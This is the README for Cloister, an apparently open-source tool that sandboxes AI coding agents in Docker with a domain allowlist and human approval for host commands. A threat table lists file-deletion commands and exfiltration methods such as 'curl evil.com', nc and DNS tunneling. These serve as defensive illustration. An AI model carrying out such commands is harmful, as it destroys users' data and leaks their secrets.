# Cloister

**Secure sandboxing for AI coding agents**

Cloister isolates CLI-based AI coding tools in Docker containers with strict security controls. It breaks the "[Lethal Trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)" that makes AI agents dangerous: private data access, untrusted content exposure, and unrestricted external communication.

## Quick Start

### Prerequisites

- Linux or macOS
- Docker (or compatible equivalent like OrbStack)
- Go 1.25+ (for building from source)
- A git repository to work in
- Claude Code credentials (OAuth token or API key)

### Build and Install

```bash
# Clone and build
git clone https://github.com/xdg/cloister.git
cd cloister
make build          # creates ./cloister binary

# Or install directly
go install github.com/xdg/cloister/cmd/cloister@latest
```

### Configure Credentials

Set your Claude credentials as environment variables:

```bash
# Option 1: OAuth token (for Claude Pro/Max subscribers)
# Run 'claude setup-token' first to get the token
export CLAUDE_CODE_OAUTH_TOKEN="your-oauth-token"

# Option 2: API key (for pay-per-use via Anthropic API)
export ANTHROPIC_API_KEY="your-api-key"
```

### Start a Sandboxed Session

```bash
cd ~/repos/my-project    # any git repository
cloister start           # guardian auto-starts on first use

# You're now in a sandboxed shell at /work
cloister:my-project:/work$ claude
```

Inside the cloister, `claude` runs with `--dangerously-skip-permissions` because the cloister itself is the security boundary.

### Key Commands

```bash
cloister start           # Start a cloister for the current repo
cloister list            # List running cloisters
cloister stop            # Stop the cloister for the current repo
cloister guardian status # Check guardian proxy status
cloister guardian stop   # Stop the guardian (warns if cloisters are running)
```

## Features

- **Agent agnostic** — Works with any CLI-based tool (currently only targeting Claude Code)
- **Allowlist proxy** — Network traffic restricted to approved domains (AI APIs, package registries, documentation)
- **Human-in-the-loop** — Host command execution requires explicit approval via web UI
- **Zero-trust containers** — Unprivileged, capability-dropped Docker containers on internal networks
- **Devcontainer compatible** — Leverages existing devcontainer.json while enforcing security

## How it Works

### The Problem

AI coding agents are helpful but overeager. Running in permissive mode, they can accidentally delete files outside your project, corrupt system configs, or expose credentials. The usual solution — permission prompts or simple sandboxing — faces a **completeness problem**: there are many ways to cause the same harm.

| Intent | Obvious | Alternatives |
|--------|---------|--------------|
| Delete a file | `rm foo.txt` | `> foo.txt`, `truncate -s0`, `mv foo.txt /dev/null` |
| Exfiltrate data | `curl evil.com` | `wget`, `nc`, Python urllib, DNS tunneling |

A policy must anticipate every mechanism; a misguided AI only needs to find one that wasn't forbidden. Clicking through prompts creates a false sense of security while interrupting your flow.

### The Approach

Some sandboxes use **action control**: enumerate what the agent can do, then allow or deny each operation. Cloister uses **scope control**: limit *where* the agent can have effects, then give it freedom within those boundaries.

| Scope | Boundary |
|-------|----------|
| **Filesystem** | Project directory only; sensitive paths blocked |
| **Network** | Allowlisted domains only (AI APIs, package registries, docs) |
| **Host** | Commands require human approval via web UI |

### Architecture

![Network Topology](docs/diagrams/network-topology.svg)

1. **Isolated containers** run on an internal Docker network with no direct internet access
2. **All HTTP(S) traffic** routes through cloister-guardian's allowlist proxy
3. **Host commands** (git push, docker build, etc.) require approval via web UI
4. **Project files** are bind-mounted; everything else is inaccessible

## Configuration

Cloister works out of the box with sensible defaults. See [docs/config-reference.md](docs/config-reference.md) for details.

## Current Limitations

Cloister is in active development (Phase 1). Current limitations include:

**Hardcoded network allowlist** — The proxy currently permits only these domains:
- `api.anthropic.com` (Claude API)
- `api.openai.com` (OpenAI API)
- `generativelanguage.googleapis.com` (Google Gemini API)

Package registries (npm, PyPI, Go modules), documentation sites, and other domains are not yet permitted. Custom domain configuration will be available in Phase 2.

**Manual credential setup** — Claude Code credentials must be set via environment variables (`CLAUDE_CODE_OAUTH_TOKEN` or `ANTHROPIC_API_KEY`). A setup wizard will be added in Phase 3.

**No host command execution** — The `hostexec` feature for running host commands (git push, docker build, etc.) with approval is not yet implemented. This is planned for Phase 4.

See [docs/implementation-phases.md](docs/implementation-phases.md) for the full roadmap.

## Contributing

Contributions welcome as long as they align with the spec and roadmap in the [docs](docs/) direcotry! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

Before submitting a PR:
1. Run tests: `go test ./...`
2. Run linter: `golangci-lint run`
3. Ensure your changes don't weaken security controls

## Security

If you discover a security vulnerability, please report it via [GitHub Security Advisories](https://github.com/xdg/cloister/security/advisories/new) rather than opening a public issue.

## License

Apache License 2.0 — See [LICENSE](LICENSE) for details.

## Copyright

Copyright 2026 David A. Golden

## Acknowledgments

- Simon Willison for articulating the [Lethal Trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) threat model
